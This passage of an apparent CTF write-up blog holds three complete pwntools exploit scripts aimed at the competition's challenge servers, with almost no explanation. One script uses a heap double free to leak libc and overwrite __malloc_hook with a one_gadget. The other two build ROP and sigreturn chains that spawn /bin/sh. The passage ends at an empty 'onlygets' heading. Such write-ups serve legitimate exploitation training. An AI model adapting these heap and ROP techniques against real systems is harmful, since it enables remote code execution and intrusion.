class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    libc = <span class="title function_">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31060&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(idx):</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(idx))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">add</span>(size, data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(size))</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;&gt; &#x27;</span>, data) </span><br><span class="line"></span><br><span class="line">def <span class="title function_">delete</span>(idx):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(idx).<span class="title function_">encode</span>())</span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span>(data):</span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;&gt; &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">fake_addr = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    pay = <span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x61</span>)</span><br><span class="line">    pay += b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x80</span> + <span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x21</span>, b<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>) + <span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x21</span>)</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;&gt; &#x27;</span>, pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">0</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, <span class="title function_">p64</span>(fake_addr))# <span class="number">2</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">3</span> &amp; <span class="number">1</span></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x50</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">5</span> &amp; fake</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(<span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    libc.<span class="property">address</span> = <span class="title function_">u64</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;!&#x27;</span>, drop=<span class="title class_">True</span>).<span class="title function_">ljust</span>(<span class="number">8</span>, b<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">    ones = [<span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;libc&#x27;</span>, libc.<span class="property">address</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(<span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x60</span>, b<span class="string">&#x27;a&#x27;</span>)# <span class="number">6</span></span><br><span class="line">    <span class="title function_">delete</span>(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">edit</span>(<span class="title function_">fit</span>(<span class="number">0</span>, <span class="number">0x71</span>, libc.<span class="property">sym</span>.<span class="property">__malloc_hook</span> - <span class="number">0x23</span>))</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x60</span>, b<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">0x60</span>, b<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x13</span> + <span class="title function_">p64</span>(libc.<span class="property">address</span> + ones[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="title function_">cmd</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&#x27;&gt; &#x27;</span>, <span class="title function_">str</span>(<span class="number">0x50</span>))</span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p)</span><br><span class="line">    # <span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="overflow">overflow</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node2.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;30268&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">name_addr = <span class="number">0x80EF320</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    p1 = b<span class="string">&#x27;&#x27;</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee060</span>) # @ .<span class="property">data</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b470a</span>) # pop eax ; ret</span><br><span class="line">    p1 += b<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) # mov dword ptr [edx], eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee064</span>) # @ .<span class="property">data</span> + <span class="number">4</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b470a</span>) # pop eax ; ret</span><br><span class="line">    p1 += b<span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) # mov dword ptr [edx], eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) # @ .<span class="property">data</span> + <span class="number">8</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080507e0</span>) # xor eax, eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080597c2</span>) # mov dword ptr [edx], eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049022</span>) # pop ebx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee060</span>) # @ .<span class="property">data</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049802</span>) # pop ecx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) # @ .<span class="property">data</span> + <span class="number">8</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08060bd1</span>) # pop edx ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ee068</span>) # @ .<span class="property">data</span> + <span class="number">8</span></span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080507e0</span>) # xor eax, eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08082bbe</span>) # inc eax ; ret</span><br><span class="line">    p1 += <span class="title function_">pack</span>(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049c6a</span>) # int <span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;name?\n&#x27;</span>, p1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay = b<span class="string">&#x27;a&#x27;</span>*<span class="number">0xc8</span> + <span class="title function_">fit</span>(name_addr + <span class="number">0x4</span>) </span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x80498B8&quot;</span>)</span><br><span class="line">    <span class="title function_">sla</span>(b<span class="string">&quot;right?\n&quot;</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="noret">noret</h3>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.<span class="title function_">update</span>(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"># context.<span class="property">timeout</span> = <span class="number">5</span></span><br><span class="line">context.<span class="property">log_level</span> = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.<span class="property">terminal</span> = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = <span class="title function_">ELF</span>(binary, checksec=<span class="title class_">False</span>)</span><br><span class="line"><span class="variable constant_">DEBUG</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="attr">DEBUG</span>:</span><br><span class="line">    libc = elf.<span class="property">libc</span></span><br><span class="line">    p = <span class="title function_">process</span>(binary)</span><br><span class="line"><span class="attr">else</span>:</span><br><span class="line">    # libc = <span class="title function_">ELF</span>(<span class="string">&#x27;&#x27;</span>, checksec=<span class="title class_">False</span>)</span><br><span class="line">    host = <span class="string">&#x27;node1.tgctf.woooo.tech&#x27;</span></span><br><span class="line">    port = <span class="string">&#x27;31720&#x27;</span></span><br><span class="line">    p = <span class="title function_">remote</span>(host,port)</span><br><span class="line"></span><br><span class="line">sla = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendlineafter</span>(delim, data)</span><br><span class="line">sa  = lambda delim, <span class="attr">data</span>:     p.<span class="title function_">sendafter</span>(delim, data)</span><br><span class="line">s   = lambda <span class="attr">data</span>:            p.<span class="title function_">send</span>(data)</span><br><span class="line">sl  = lambda <span class="attr">data</span>:            p.<span class="title function_">sendline</span>(data)</span><br><span class="line">ru  = lambda delim, **<span class="attr">kwargs</span>: p.<span class="title function_">recvuntil</span>(delim, **kwargs)</span><br><span class="line">io  = <span class="attr">lambda</span>:                 p.<span class="title function_">interactive</span>()</span><br><span class="line">log = lambda name, <span class="attr">data</span>:      <span class="title function_">success</span>(f<span class="string">&#x27;&#123;name&#125;: &#123;data:#x&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x40219C</span></span><br><span class="line">xor_rax = <span class="number">0x40100A</span></span><br><span class="line">pop_rcx = <span class="number">0x401029</span></span><br><span class="line">pop_rdx = <span class="number">0x401021</span></span><br><span class="line">add_rax_rdx = <span class="number">0x401024</span></span><br><span class="line">mov_rsi = <span class="number">0x40101B</span></span><br><span class="line">xchg_rax_rdi = <span class="number">0x401000</span></span><br><span class="line">syscall_ret = <span class="number">0x40113D</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span>(data):</span><br><span class="line">    <span class="title function_">sa</span>(b<span class="string">&#x27;do?\n&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">main</span>():</span><br><span class="line">    <span class="title function_">cmd</span>(b<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    ret_addr = <span class="title function_">u64</span>(<span class="title function_">ru</span>(b<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].<span class="title function_">ljust</span>(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    rop_addr = ret_addr - <span class="number">0x100</span></span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&#x27;ret_addr&#x27;</span>, ret_addr)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">cmd</span>(b<span class="string">&#x27;2&#x27;</span>.<span class="title function_">ljust</span>(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>) + b<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">ru</span>(b<span class="string">&#x27;feedback: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    xor_rax_addr = ret_addr + <span class="number">0x10</span></span><br><span class="line">    pop_rcx_addr = ret_addr + <span class="number">0x18</span></span><br><span class="line">    pop_rdx_addr = ret_addr + <span class="number">0x20</span></span><br><span class="line">    add_rax_rdx_addr = ret_addr + <span class="number">0x28</span></span><br><span class="line">    syscall_ret_addr = ret_addr + <span class="number">0x30</span></span><br><span class="line">    back_addr = ret_addr + <span class="number">0x38</span></span><br><span class="line">    xchg_rax_rdi_addr = ret_addr + <span class="number">0x40</span></span><br><span class="line">    mov_rsi_addr = ret_addr + <span class="number">0x48</span></span><br><span class="line">    inc_rdi_syscall_addr = ret_addr + <span class="number">0x50</span></span><br><span class="line">    my_read_addr = ret_addr + <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">    # pay = <span class="title function_">fit</span>(</span><br><span class="line">    #         xor_rax_addr - <span class="number">1</span>, <span class="number">0</span>, back_addr,</span><br><span class="line">    #         add_rax_rdx_addr - <span class="number">1</span>, back_addr, buf_addr + <span class="number">0x8</span>,</span><br><span class="line">    #         mov_rsi_addr - <span class="number">1</span>, buf_addr + <span class="number">0x20</span>, back_addr,</span><br><span class="line">    #         pop_rcx_addr - <span class="number">1</span>, pop_rcx_addr, xchg_rax_rdi_addr,  </span><br><span class="line"></span><br><span class="line">    #         )</span><br><span class="line">    </span><br><span class="line">    frame = <span class="title class_">SigreturnFrame</span>()</span><br><span class="line">    frame.<span class="property">rdi</span> = buf_addr + <span class="number">0x8</span></span><br><span class="line">    frame.<span class="property">rsi</span> = <span class="number">0</span></span><br><span class="line">    frame.<span class="property">rdx</span> = <span class="number">0</span></span><br><span class="line">    frame.<span class="property">rsp</span> = rop_addr</span><br><span class="line">    frame.<span class="property">rax</span> = <span class="number">0x3b</span></span><br><span class="line">    frame.<span class="property">rip</span> = <span class="number">0x401153</span></span><br><span class="line"></span><br><span class="line">    pay = <span class="title function_">fit</span>(</span><br><span class="line">            mov_rsi_addr - <span class="number">1</span>, ret_addr + <span class="number">0x58</span> - <span class="number">0x10</span>, back_addr,</span><br><span class="line">            my_read_addr - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x500</span>, <span class="number">0x40100F</span>, elf.<span class="title function_">bss</span>(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pay = pay.<span class="title function_">ljust</span>(<span class="number">0x100</span>, b<span class="string">&#x27;\x00&#x27;</span>) + <span class="title function_">p64</span>(<span class="number">0x40100F</span>) + <span class="title function_">p64</span>(rop_addr)</span><br><span class="line">    pay += <span class="title function_">fit</span>(xor_rax, pop_rcx, pop_rdx, add_rax_rdx, syscall_ret, <span class="number">0x401010</span>, xchg_rax_rdi</span><br><span class="line">               , mov_rsi, <span class="number">0x401150</span>, elf.<span class="title function_">bss</span>(<span class="number">0x500</span>), <span class="number">0x40115D</span>)</span><br><span class="line"></span><br><span class="line">    # gdb.<span class="title function_">attach</span>(p, <span class="string">&quot;b *0x4010F6&quot;</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line">    pay = <span class="title function_">fit</span>(</span><br><span class="line">            xor_rax_addr - <span class="number">1</span>, <span class="number">0</span>, back_addr,</span><br><span class="line">            add_rax_rdx_addr - <span class="number">1</span>, back_addr, <span class="number">0xf</span>,</span><br><span class="line">            syscall_ret_addr - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            )</span><br><span class="line">    pay += <span class="title function_">bytes</span>(frame)</span><br><span class="line">    <span class="title function_">sleep</span>(<span class="number">0.3</span>)</span><br><span class="line">    <span class="title function_">s</span>(pay)</span><br><span class="line"></span><br><span class="line">    <span class="title function_">io</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_">main</span>()</span><br></pre></td></tr></table></figure>
<h3 id="onlygets">onlygets</h3>
